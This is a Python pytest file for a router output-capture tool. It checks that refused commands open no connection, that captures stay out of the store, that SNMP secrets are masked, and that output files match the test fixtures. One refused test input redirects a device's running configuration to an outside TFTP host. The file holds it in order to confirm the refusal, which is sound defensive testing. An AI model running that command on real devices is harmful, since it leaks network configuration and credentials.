"""`nmas-capture-output`: the probe, kept as a tool (the operator, 2026-09-27).

What it must guarantee: a refused command connects to nothing; captures
never land in the store; a capture that redaction changed says so, because
it is not byte for byte what the device printed; and its file names are the
ones the parser tests read.
"""

import importlib.machinery
import importlib.util
import os

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def _script():
    path = os.path.join(ROOT, "scripts", "nmas-capture-output")
    loader = importlib.machinery.SourceFileLoader("nmas_capture_output", path)
    mod = importlib.util.module_from_spec(importlib.util.spec_from_loader(loader.name, loader))
    loader.exec_module(mod)
    return mod


@pytest.fixture
def no_connection(monkeypatch):
    def refuse(*_a, **_k):
        raise AssertionError("a connection was opened")
    monkeypatch.setattr("modules.connection.with_temp_connection", refuse)


class TestNothingConnectsWhenRefused:
    @pytest.mark.parametrize("cmd", ["show running-config | redirect tftp://192.0.2.9/x",
                                     "configure terminal", "clear ip ospf process"])
    def test_a_refused_command(self, cmd, no_connection, capsys):
        assert _script().main(["--device", "r3", "--command", "show clock",
                               "--command", cmd]) == 1
        out = capsys.readouterr().out
        assert "REFUSED" in out and "Nothing connected" in out

    def test_an_out_directory_inside_the_store(self, no_connection, capsys):
        from modules import config
        target = os.path.join(config.DATA_DIR, "captures")
        assert _script().main(["--device", "r3", "--command", "show clock",
                               "--out", target]) == 1
        assert "inside the store" in capsys.readouterr().out

    def test_a_device_not_in_the_inventory(self, no_connection, capsys):
        assert _script().main(["--device", "no-such-device", "--command", "show clock"]) == 1
        assert "not in the inventory" in capsys.readouterr().out


class TestACaptureSaysWhenItIsNotFaithful:
    def _capture(self, raw):
        mod = _script()
        monkey = {"show run | include snmp": raw}

        def connect(_dev, work):
            class Conn:
                pass
            return work(Conn())

        import modules.commands as commands
        original = commands.run_device_command
        commands.run_device_command = lambda _c, cmd, **_k: monkey[cmd]
        try:
            return mod.capture({}, ["show run | include snmp"], connect=connect)
        finally:
            commands.run_device_command = original

    def test_redaction_changed_it(self):
        got = self._capture("snmp-server community Sup3rS3cretValue RO\n")
        r = got["show run | include snmp"]
        assert r["masked"] is True and "Sup3rS3cretValue" not in r["text"]

    def test_the_control_nothing_to_mask(self):
        got = self._capture("snmp-server location lab\n")
        assert got["show run | include snmp"]["masked"] is False


class TestItsFilesAreTheFixtures:
    def test_the_slug_names_an_existing_fixture(self):
        name = _script().slug("show ip bgp summary")
        assert os.path.exists(os.path.join(ROOT, "tests", "fixtures", "operational",
                                           f"r3__{name}.txt"))

    def test_bytecode_is_off_before_any_import(self):
        src = open(os.path.join(ROOT, "scripts", "nmas-capture-output"), encoding="utf-8").read()
        body = src.split('"""', 2)[2]
        assert body.index("sys.dont_write_bytecode = True") < body.index("import argparse")
